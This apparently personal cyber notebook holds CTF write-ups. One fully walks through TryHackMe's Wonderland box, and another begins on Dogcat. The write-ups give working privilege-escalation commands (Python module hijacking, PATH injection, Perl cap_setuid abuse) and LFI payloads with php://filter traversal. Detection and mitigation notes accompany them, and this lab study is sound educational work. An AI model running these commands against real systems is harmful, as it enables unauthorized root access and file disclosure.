<!DOCTYPE HTML>
<html lang="en" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Ruohao&#x27;s Cyber Notes &amp; Writeups</title>
        <meta name="robots" content="noindex">


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="highlight-css" href="highlight.css">
        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "";
            const default_light_theme = "light";
            const default_dark_theme = "navy";
            window.path_to_searchindex_js = "searchindex.js";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="toc.js"></script>
    </head>
    <body>
    <div id="mdbook-help-container">
        <div id="mdbook-help-popup">
            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
            <div>
                <p>Press <kbd>‚Üê</kbd> or <kbd>‚Üí</kbd> to navigate between chapters</p>
                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
                <p>Press <kbd>?</kbd> to show this help</p>
                <p>Press <kbd>Esc</kbd> to hide this help</p>
            </div>
        </div>
    </div>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
                sidebar_toggle.checked = false;
            }
            if (sidebar === 'visible') {
                sidebar_toggle.checked = true;
            } else {
                html.classList.remove('sidebar-visible');
            }
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Ruohao&#x27;s Cyber Notes &amp; Writeups</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <div class="search-wrapper">
                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                            <div class="spinner-wrapper">
                                <i class="fa fa-spinner fa-spin"></i>
                            </div>
                        </div>
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <!-- --- -->
<!-- # Keep front-matter minimal; tags here are optional if you use mdbook-tags -->
<!-- title: "Welcome" -->
<!-- --- -->
<!-- Hero / Title -->
<h1 align="center">üõ°Ô∏è My Cyber Notebook</h1>
<p align="center">
  Notes, references, and CTF writeups ‚Äî stitched together with curiosity, reproducibility, and a mildly unhealthy love for automation.
</p>
<!-- Badges -->
<p align="center">
  <a href="https://github.com/Ruohao1"><img alt="GitHub"
     src="https://img.shields.io/badge/GitHub-Ruohao1-black?logo=github"></a>
  <a href="https://tryhackme.com/p/ruohao"><img alt="TryHackMe"
     src="https://img.shields.io/badge/TryHackMe-ruohao-darkred?logo=tryhackme"></a>
  <a href="https://linkedin.com/in/ruohaolin"><img alt="LinkedIn"
     src="https://img.shields.io/badge/LinkedIn-ruohaolin-0A66C2?logo=linkedin"></a>
  <a href="https://ruohao.dev"><img alt="Portfolio"
     src="https://img.shields.io/badge/Portfolio-ruohao.dev-111111?logo=vercel"></a>
</p>
<!-- Quick links / CTA -->
<p align="center">
  <a href="./notes/README.html"><b>Browse Notes</b></a> ‚Ä¢
  <a href="./writeups/README.html"><b>See Writeups</b></a> ‚Ä¢
  <a href="./references/README.html"><b>Reference Hub</b></a>
</p>
<hr />
<h2 id="what-this-is"><a class="header" href="#what-this-is">What this is</a></h2>
<p>This book is a growing collection of <strong>concise notes</strong>, <strong>repeatable configs</strong>, and <strong>step-by-step writeups</strong> from my work in:</p>
<ul>
<li>Linux hardening &amp; privesc, network forensics, web exploitation, and reversing.</li>
<li>My homelab (Proxmox + LXC/Docker, segmented networks, Tailscale, TLS).</li>
<li>Ansible roles/playbooks for CIS/ANSSI-style hardening and lab automation.</li>
</ul>
<p>Where helpful, pages are tagged (e.g., <code>linux</code>, <code>privesc</code>, <code>web</code>, <code>pwn</code>, <code>ansible</code>). If you have <code>mdbook-tags</code> enabled, you‚Äôll get automatic tag indexes under <code>/tags/‚Ä¶</code>.</p>
<blockquote>
<p><em>‚ÄúDocument what you break, so you can break it better next time.‚Äù</em></p>
</blockquote>
<hr />
<h2 id="structure"><a class="header" href="#structure">Structure</a></h2>
<ul>
<li><strong>Notes</strong> ‚Äî short, focused pages: theory, commands, gotchas.<br />
Start here: <strong><a href="./notes/README.html">notes/README.md</a></strong></li>
<li><strong>Writeups</strong> ‚Äî full walkthroughs for TryHackMe, Root-Me, FCSC, etc.<br />
Start here: <strong><a href="./writeups/README.html">writeups/README.md</a></strong></li>
<li><strong>References</strong> ‚Äî tools I reuse, shell snippets, bibliography.<br />
Start here: <strong><a href="./references/README.html">references/README.md</a></strong></li>
</ul>
<p>If search is enabled (<code>mdbook-search</code>), use the üîç bar to jump to commands or error strings.</p>
<hr />
<h2 id="homelab-snapshot"><a class="header" href="#homelab-snapshot">Homelab snapshot</a></h2>
<p align="center">
  <!-- Drop your diagram at: src/assets/homelab.png -->
  <img src="./assets/homelab.png" alt="Homelab diagram" width="720">
</p>
<ul>
<li>Segmented services (Pi-hole, Vaultwarden, Nextcloud AIO, Jellyfin, SIEMini).</li>
<li>LXC + Docker Compose + Ansible for repeatability.</li>
<li>Logs routed to a mini-SIEM (Snort3, Syslog-NG, Elastic/Kibana).</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><!-- --- -->
<!-- title: "Notes" -->
<!-- --- -->
<!---->
<h1 align="center">üõ°Ô∏è Notes</h1>
<p>This section is my <strong>technical notebook</strong> ‚Äî a living collection of what I learn, test, and refine across cybersecurity, system administration, and software engineering.</p>
<hr />
<p>I use these notes to:</p>
<ul>
<li>Consolidate fragmented knowledge from CTFs, labs, and courses.</li>
<li>Record useful commands, configurations, and short explanations.</li>
<li>Bridge concepts between offensive, defensive, and operational security.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux"><a class="header" href="#linux">Linux</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="permissions"><a class="header" href="#permissions">Permissions</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="networking"><a class="header" href="#networking">Networking</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="hardening"><a class="header" href="#hardening">Hardening</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="web"><a class="header" href="#web">Web</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="xss"><a class="header" href="#xss">XSS</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="jwt"><a class="header" href="#jwt">JWT</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="reverse-engineering"><a class="header" href="#reverse-engineering">Reverse Engineering</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ghidra"><a class="header" href="#ghidra">Ghidra</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="pwntools"><a class="header" href="#pwntools">Pwntools</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="shellcode"><a class="header" href="#shellcode">Shellcode</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="writeups"><a class="header" href="#writeups">Writeups</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="tryhackme"><a class="header" href="#tryhackme">TryHackMe</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="wonderland-ctf"><a class="header" href="#wonderland-ctf">Wonderland CTF</a></h1>
<blockquote>
<p>End‚Äëto‚Äëend exploitation path with commands, rationale, and mitigations.</p>
</blockquote>
<h2 id="scope--target"><a class="header" href="#scope--target">Scope &amp; Target</a></h2>
<ul>
<li><strong>Host:</strong> <code>10.201.105.251</code></li>
<li><strong>Goal:</strong> Obtain user and root flags</li>
<li><strong>Methodology:</strong> Recon ‚Üí Web enum ‚Üí Initial access ‚Üí Priv‚Äëesc chain (alice ‚Üí rabbit ‚Üí hatter ‚Üí root)</li>
</ul>
<hr />
<h2 id="tldr-path"><a class="header" href="#tldr-path">TL;DR Path</a></h2>
<ol>
<li><strong>Web enum</strong> discovers <code>/r/a/b/b/i/t/</code> and reveals credentials <code>alice:HowDothTheLittleCrocodileImproveHisShiningTail</code>.</li>
<li><strong>SSH</strong> as <code>alice</code>.</li>
<li><strong>Sudo‚Äëallowed Python</strong> as user <code>rabbit</code> executes <code>/home/alice/walrus_and_the_carpenter.py</code>; <strong>hijack Python module resolution</strong> with a malicious <code>random.py</code> to pop a shell as <code>rabbit</code>.</li>
<li><strong>Tea Party binary</strong> is vulnerable to <strong>PATH injection</strong> on <code>date</code>; craft <code>/tmp/bin/date</code> ‚Üí shell as <code>hatter</code>.</li>
<li>Enumerate <strong>capabilities</strong>; <code>/usr/bin/perl</code> has <code>cap_setuid+ep</code>. Use Perl to setuid(0) ‚Üí <strong>root</strong>.</li>
<li>Read flags.</li>
</ol>
<hr />
<h2 id="recon"><a class="header" href="#recon">Recon</a></h2>
<h3 id="nmap"><a class="header" href="#nmap">Nmap</a></h3>
<pre><code class="language-bash">nmap -sV -Pn -oN nmap.txt 10.201.105.251
# 22/tcp open  ssh OpenSSH 7.6p1
# 80/tcp open  http Golang net/http server
</code></pre>
<p>Notes: Two exposed services, HTTP on 80 looks like a Go server, likely a light file server or app; SSH is present for potential credential reuse.</p>
<h3 id="content-discovery"><a class="header" href="#content-discovery">Content Discovery</a></h3>
<pre><code class="language-bash">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.201.105.251/FUZZ
# ... r (301), img (301), index.html (301)

ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.201.105.251/r/FUZZ
# ... a (301)
</code></pre>
<p>Manual traversal suggests a rabbit‚Äëhole (literally).</p>
<hr />
<h2 id="web-enumeration--credential-disclosure"><a class="header" href="#web-enumeration--credential-disclosure">Web Enumeration ‚Üí Credential Disclosure</a></h2>
<p>Progressive path guessing:</p>
<pre><code class="language-bash">curl http://10.201.105.251/r/
curl http://10.201.105.251/r/a/
curl http://10.201.105.251/r/a/b/b/i/t/
</code></pre>
<p>Final page contains a hidden line with credentials:</p>
<pre><code class="language-html">&lt;p style="display: none;"&gt;
  alice:HowDothTheLittleCrocodileImproveHisShiningTail
&lt;/p&gt;
</code></pre>
<hr />
<h2 id="initial-foothold-ssh--alice"><a class="header" href="#initial-foothold-ssh--alice">Initial Foothold (SSH ‚Üí alice)</a></h2>
<pre><code class="language-bash">ssh alice@10.201.105.251
whoami &amp;&amp; id &amp;&amp; ls -la
# user: alice
</code></pre>
<p>Interesting files:</p>
<ul>
<li><code>~/walrus_and_the_carpenter.py</code></li>
<li><code>~/root.txt</code> (not readable yet)</li>
</ul>
<p>Sudo privileges:</p>
<pre><code class="language-bash">sudo -l
# (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
</code></pre>
<hr />
<h2 id="alice--rabbit-python-module-hijacking-via-randompy"><a class="header" href="#alice--rabbit-python-module-hijacking-via-randompy">alice ‚Üí rabbit: Python Module Hijacking via <code>random.py</code></a></h2>
<p><code>walrus_and_the_carpenter.py</code>:</p>
<pre><code class="language-python">import random
poem = """..."""
for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
</code></pre>
<p><strong>Observation:</strong> Python‚Äôs import order puts the <strong>script directory</strong> early in <code>sys.path</code>. If we drop a <code>random.py</code> next to the target script, it will be imported <strong>instead of</strong> the stdlib <code>random</code> module.</p>
<p>Create malicious module:</p>
<pre><code class="language-python"># /home/alice/random.py
import os
os.execl('/bin/bash', 'bash', '-p')
</code></pre>
<p>Execute as <code>rabbit</code> via sudo:</p>
<pre><code class="language-bash">sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
whoami
# rabbit
</code></pre>
<hr />
<h2 id="rabbit--hatter-path-injection-on-teaparty"><a class="header" href="#rabbit--hatter-path-injection-on-teaparty">rabbit ‚Üí hatter: PATH Injection on <code>teaParty</code></a></h2>
<p>List rabbit‚Äôs home:</p>
<pre><code class="language-bash">ls -la /home/rabbit
# teaParty (ELF or script)
/home/rabbit/teaParty
# Output includes: "Probably by Sun, 09 Nov 2025 00:46:02 +0000"
# The program likely calls `date` without an absolute path.
</code></pre>
<p>Exploit by shadowing <code>date</code>:</p>
<pre><code class="language-bash">mkdir -p /tmp/bin
printf '#!/bin/sh\n/bin/sh -p\n' &gt; /tmp/bin/date
chmod +x /tmp/bin/date
PATH=/tmp/bin:$PATH /home/rabbit/teaParty

id
# uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
</code></pre>
<hr />
<h2 id="hatter--root-linux-capabilities-perl-cap_setuid"><a class="header" href="#hatter--root-linux-capabilities-perl-cap_setuid">hatter ‚Üí root: Linux Capabilities (Perl <code>cap_setuid</code>)</a></h2>
<p>Enumerate capabilities:</p>
<pre><code class="language-bash">getcap -r / 2&gt;/dev/null
# /usr/bin/perl = cap_setuid+ep
# /usr/bin/perl5.x = cap_setuid+ep
</code></pre>
<p>Abuse with Perl:</p>
<pre><code class="language-bash">/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
id
# uid=0(root)
</code></pre>
<hr />
<h2 id="loot-flags"><a class="header" href="#loot-flags">Loot (Flags)</a></h2>
<pre><code class="language-bash">cat /root/user.txt /home/alice/root.txt
# thm{"Curiouser and curiouser!"}
# thm{Twinkle, twinkle, little bat! How I wonder what you‚Äôre at!}
</code></pre>
<hr />
<h2 id="detection--forensics-notes"><a class="header" href="#detection--forensics-notes">Detection &amp; Forensics Notes</a></h2>
<ul>
<li>Web access logs for <code>/r/a/b/b/i/t/</code> reveal reconnaissance timeline.</li>
<li><code>.bash_history</code> for <code>alice</code>, <code>rabbit</code>, <code>hatter</code> (if not restricted) exposes commands: <code>sudo -u rabbit ...</code>, <code>PATH=/tmp/bin:$PATH ...</code>, Perl setuid exploit.</li>
<li>File system artifacts:
<ul>
<li><code>/home/alice/random.py</code></li>
<li><code>/tmp/bin/date</code></li>
</ul>
</li>
<li><code>auth.log</code> / <code>secure</code> entries for escalations tied to <code>sudo</code> and SSH sessions.</li>
<li><code>getcap</code> enumeration indicates misconfiguration (capability left on an interpreter).</li>
</ul>
<hr />
<h2 id="mitigations"><a class="header" href="#mitigations">Mitigations</a></h2>
<ul>
<li><strong>Web app / Content:</strong> Don‚Äôt expose credentials in hidden DOM; move secrets to server‚Äëside; apply content reviews.</li>
<li><strong>Least privilege:</strong> Remove sudo rules that allow executing interpreters; if needed, whitelist exact binaries with <strong>absolute</strong> interpreter paths and <code>NOEXEC</code> mounts where possible.</li>
<li><strong>Python imports:</strong> Execute with sanitized <code>PYTHONPATH</code>; vendor required modules; run with <code>-I</code> (isolated mode) or set <code>sys.path</code> explicitly.</li>
<li><strong>PATH safety:</strong> In set‚Äëuid or privileged binaries, <strong>use absolute paths</strong> for all external calls or drop privileges before invoking utilities.</li>
<li><strong>Capabilities:</strong> Avoid granting <code>cap_setuid</code> to interpreters (Perl/Python). If required, wrap capability into a minimal, audited helper in C that drops privileges immediately after use.</li>
<li><strong>Monitoring:</strong> Alert on capability changes (<code>setcap</code>), unexpected binaries in world‚Äëwritable directories (<code>/tmp/bin/*</code>), and suspicious <code>sudo -u &lt;otheruser&gt;</code> patterns.</li>
</ul>
<hr />
<h2 id="appendix--full-command-log"><a class="header" href="#appendix--full-command-log">Appendix ‚Äî Full Command Log</a></h2>
<pre><code class="language-bash"># Recon
nmap -sV -Pn -oN nmap.txt 10.201.105.251
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.201.105.251/FUZZ
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.201.105.251/r/FUZZ
curl http://10.201.105.251/r/a/b/b/i/t/

# Initial access
ssh alice@10.201.105.251

# Escalate to rabbit
cat /home/alice/walrus_and_the_carpenter.py
printf 'import os\nos.execl(\"/bin/bash\",\"bash\",\"-p\")\n' &gt; /home/alice/random.py
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

# Rabbit ‚Üí Hatter (PATH injection)
mkdir -p /tmp/bin
printf '#!/bin/sh\n/bin/sh -p\n' &gt; /tmp/bin/date
chmod +x /tmp/bin/date
PATH=/tmp/bin:$PATH /home/rabbit/teaParty

# Hatter ‚Üí Root (capabilities)
getcap -r / 2&gt;/dev/null | grep perl
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# Proof
cat /root/user.txt /home/alice/root.txt
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="dogcat-ctf--full-write-up"><a class="header" href="#dogcat-ctf--full-write-up">Dogcat CTF ‚Äî Full Write-Up</a></h1>
<h2 id="tldr"><a class="header" href="#tldr">TL;DR</a></h2>
<ul>
<li><strong>Entry:</strong> PHP local file inclusion (LFI) via <code>?view=</code> + <strong>path traversal</strong> and <strong>php://filter</strong> ‚Üí source disclosure and <code>/etc/passwd</code>.</li>
<li><strong>Execution:</strong> <strong>Log poisoning</strong> of Apache access log ‚Üí include log to execute PHP ‚Üí <strong>reverse shell</strong>.</li>
<li><strong>PrivEsc #1 (container):</strong> SUID-bit on <code>/usr/bin/env</code> ‚Üí <code>bash -p</code> ‚Üí <strong>root in container</strong>.</li>
<li><strong>PrivEsc #2 (host):</strong> Writable backup script in <code>/opt/backups/backup.sh</code> ‚Üí command injection ‚Üí <strong>root on host</strong>.</li>
<li><strong>Loot:</strong> <code>flag1</code> (web root), <code>flag2</code> (FS), <code>flag3</code> (container root), <code>flag4</code> (host root).</li>
</ul>
<hr />
<h2 id="recon-1"><a class="header" href="#recon-1">Recon</a></h2>
<p>![[writeups/tryhackme/dogcat/images/index.png]]</p>
<h3 id="port-scan"><a class="header" href="#port-scan">Port scan</a></h3>
<pre><code class="language-bash">nmap -sV -Pn -oN nmap.txt 10.201.127.166
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
</code></pre>
<p>Rationale: quick service discovery to pick the likely web attack surface. SSH noted but de-prioritized until creds/keys appear.</p>
<h3 id="content-discovery-1"><a class="header" href="#content-discovery-1">Content discovery</a></h3>
<pre><code class="language-bash">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.201.127.166/\?view\=FUZZ -fw 77
acatalog                [Status: 200, Size: 759, Words: 106, Lines: 24, Duration: 171ms]
alcatel                 [Status: 200, Size: 757, Words: 106, Lines: 24, Duration: 174ms]
application             [Status: 200, Size: 765, Words: 106, Lines: 24, Duration: 178ms]
[OMITTED]
</code></pre>
<pre><code class="language-bash">curl 'http://10.201.127.166/?view=acatalog'
[OMITTED]
&lt;b&gt;Warning&lt;/b&gt;:  include(tomcat.php): failed to open stream: No such file or directory in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;24&lt;/b&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;b&gt;Warning&lt;/b&gt;:  include(): Failed opening 'acatalog.php' for inclusion (include_path='.:/usr/local/lib/php') in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;24&lt;/b&gt;
</code></pre>
<p>Observation: the app <strong>routes by <code>view</code></strong>, returning 200 for many tokens, hinting at a server-side <code>include</code> pattern. Errors show <code>include(&lt;view&gt;.php)</code> from <code>index.php</code>. Hypothesis: <strong>LFI with extension control</strong>.</p>
<hr />
<h2 id="vulnerability-analysis-lfi--rce"><a class="header" href="#vulnerability-analysis-lfi--rce">Vulnerability Analysis (LFI ‚Üí RCE)</a></h2>
<pre><code class="language-bash">curl 'http://10.201.127.166/?view=php://filter/convert.base64-encode/resource=index' 
[OMITTED]
&lt;br&gt;
        Sorry, only dogs or cats are allowed.    &lt;/div&gt;
</code></pre>
<h3 id="source-disclosure-via-phpfilter"><a class="header" href="#source-disclosure-via-phpfilter">Source disclosure via php://filter</a></h3>
<pre><code class="language-bash">curl 'http://10.201.127.166/?view=php://filter/convert.base64-encode/resource=dog/../index' 
[OMITTED]
PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==
</code></pre>
<pre><code class="language-bash">echo "PCFET0NUWVBFIEhUTUw+..." | base64 -d
[OMITTED]
        &lt;?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	   $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?&gt;
</code></pre>
<p>Key insight: We can <strong>bypass file type enforcement</strong> using <code>&amp;ext=</code> (empty) and use <code>php://filter</code> to read files. Also, the allowlist only gates the ‚Äúhappy path‚Äù; we can still hit the <strong>else</strong> branch and include arbitrary paths when paired with traversal.</p>
<h3 id="read-arbitrary-files-path-traversal"><a class="header" href="#read-arbitrary-files-path-traversal">Read arbitrary files (path traversal)</a></h3>
<pre><code class="language-bash">curl 'http://10.201.127.166/?view=php://filter/convert.base64-encode/resource=dog/../../../../etc/passwd&amp;ext=' 

[OMITTED]
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2